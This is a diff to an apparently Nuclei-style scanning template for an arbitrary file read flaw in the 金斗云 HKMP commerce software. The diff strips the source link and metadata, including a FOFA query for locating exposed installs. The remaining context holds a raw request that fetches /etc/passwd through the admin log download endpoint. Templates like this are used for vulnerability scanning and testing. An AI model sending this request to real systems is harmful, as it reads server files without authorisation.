@@ -3,12 +3,8 @@ info:
   name: 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yfuwknisa4mhc6vd'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yfuwknisa4mhc6vd
-    fofa: body="金斗云 Copyright"
 http:
 - raw:
   - 'GET /admin/log/download?file=/etc/passwd HTTP/1.1
